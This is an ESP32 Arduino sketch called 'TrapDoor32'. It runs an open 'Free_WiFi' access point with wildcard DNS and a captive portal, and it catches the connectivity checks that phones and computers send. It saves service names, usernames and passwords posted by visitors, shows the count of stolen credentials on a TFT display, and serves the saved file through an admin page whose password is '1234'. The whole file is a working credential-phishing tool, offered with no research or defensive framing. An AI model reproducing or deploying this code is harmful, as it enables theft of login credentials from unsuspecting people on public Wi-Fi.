#include <WiFi.h>
#include <DNSServer.h>
#include <ESPAsyncWebServer.h>
#include <SPIFFS.h>
#include <ArduinoJson.h>
#include <TFT_eSPI.h>

// Back-light control pin
#define TFT_BL 4  

// SoftAP configuration
static const char* SSID        = "Free_WiFi";
static const IPAddress AP_IP   (192,168,4,1);
static const IPAddress GW      (192,168,4,1);
static const IPAddress SN      (255,255,255,0);
static const byte      DNS_PORT = 53;

// Admin credentials for protected endpoint
static const char* ADMIN_USER = "admin";
static const char* ADMIN_PWD  = "1234";

DNSServer      dnsServer;
AsyncWebServer server(80);
TFT_eSPI       tft;

// Save one credential, keep only the last 50 entries
void saveCred(const String &svc, const String &user, const String &pass) {
  StaticJsonDocument<1024> doc;
  if (SPIFFS.exists("/creds.json")) {
    File fr = SPIFFS.open("/creds.json", FILE_READ);
    if (fr) { deserializeJson(doc, fr); fr.close(); }
  }
  JsonArray arr = doc.containsKey("entries")
                ? doc["entries"].as<JsonArray>()
                : doc.createNestedArray("entries");
  JsonObject e = arr.createNestedObject();
  e["service"] = svc;
  e["user"]    = user;
  e["pass"]    = pass;
  while (arr.size() > 50) arr.remove(0);
  File fw = SPIFFS.open("/creds.json", FILE_WRITE);
  if (fw) { serializeJson(doc, fw); fw.close(); }
}

// Redirect any unknown URI to captive portal
void handleNotFound(AsyncWebServerRequest *req) {
  req->redirect(String("http://") + AP_IP.toString() + "/");
}

// Refresh the TFT display with current stats
void updateDisplay() {
  int clients = WiFi.softAPgetStationNum();
  int creds   = 0;
  if (SPIFFS.exists("/creds.json")) {
    File f = SPIFFS.open("/creds.json", FILE_READ);
    DynamicJsonDocument doc(1024);
    if (deserializeJson(doc, f) == DeserializationError::Ok)
      creds = doc["entries"].as<JsonArray>().size();
    f.close();
  }

  // Clear the stats area
  tft.fillRect(0, 30, tft.width(), tft.height() - 30, TFT_BLACK);

  tft.setTextSize(2);

  tft.setTextColor(TFT_GREEN);
  tft.drawString("Users:", 10, 40);
  tft.setTextColor(TFT_CYAN);
  tft.drawNumber(clients,  80, 40);

  tft.setTextColor(TFT_GREEN);
  tft.drawString("Creds:", 10, 70);
  tft.setTextColor(TFT_RED);
  tft.drawNumber(creds,    80, 70);
}

void setup() {
  Serial.begin(115200);
  Serial.println("=== Booting ===");

  // Initialize SPIFFS
  if (!SPIFFS.begin(true)) {
    Serial.println("SPIFFS init failed");
  }

  // Start SoftAP and DNS server
  WiFi.softAPConfig(AP_IP, GW, SN);
  WiFi.softAP(SSID);
  dnsServer.start(DNS_PORT, "*", AP_IP);
  Serial.print("AP IP: "); Serial.println(WiFi.softAPIP());

  // Configure web server routes
  server.on("/", HTTP_GET, [](AsyncWebServerRequest *req){
    req->send(SPIFFS, "/captive.html", "text/html");
  });
  server.serveStatic("/style.css", SPIFFS, "/style.css");
  server.serveStatic("/script.js", SPIFFS, "/script.js");
  server.serveStatic("/icons/",    SPIFFS, "/icons/");

  server.on("/login", HTTP_POST, [](AsyncWebServerRequest *req){},
    nullptr,
    [](AsyncWebServerRequest *req, uint8_t *data, size_t len, size_t, size_t) {
      DynamicJsonDocument j(512);
      if (deserializeJson(j, data, len) == DeserializationError::Ok) {
        saveCred(j["service"].as<String>(),
                 j["user"].as<String>(),
                 j["pass"].as<String>());
        req->send(204);
      } else {
        req->send(400, "application/json", "{\"error\":\"invalid JSON\"}");
      }
    }
  );

  server.on("/generate_204", HTTP_GET, [](AsyncWebServerRequest *req){ req->send(204); });
  server.on("/ncsi.txt",      HTTP_GET, [](AsyncWebServerRequest *req){ req->send(204); });
  server.on("/hotspot-detect.html", HTTP_ANY, handleNotFound);
  server.on("/library/test/success.html", HTTP_ANY, handleNotFound);
  server.on("/fwlink",        HTTP_ANY, handleNotFound);
  server.onNotFound(handleNotFound);

  // Protected admin endpoint for downloading creds.json
  server.on("/admin", HTTP_GET, [](AsyncWebServerRequest *req){
    if (!req->authenticate(ADMIN_USER, ADMIN_PWD))
      return req->requestAuthentication();
    req->send(SPIFFS, "/creds.json", "application/json");
  });

  server.begin();
  Serial.println("HTTP server started");

  // Initialize TFT display in portrait mode
  tft.init();
  pinMode(TFT_BL, OUTPUT);
  digitalWrite(TFT_BL, HIGH);
  tft.setRotation(0);
  tft.fillScreen(TFT_BLACK);

  // Draw header and separator line
  tft.setTextSize(2);
  tft.setTextColor(TFT_YELLOW);
  tft.drawString("TrapDoor32", 10, 10);
  tft.drawFastHLine(0, 30, tft.width(), TFT_WHITE);

  // Draw initial zeros for stats
  tft.setTextColor(TFT_CYAN);
  tft.drawNumber(0, 80, 40);
  tft.drawNumber(0, 80, 70);
}

void loop() {
  dnsServer.processNextRequest();
  static unsigned long last = millis();
  if (millis() - last > 2000) {
    last = millis();
    updateDisplay();
  }
}
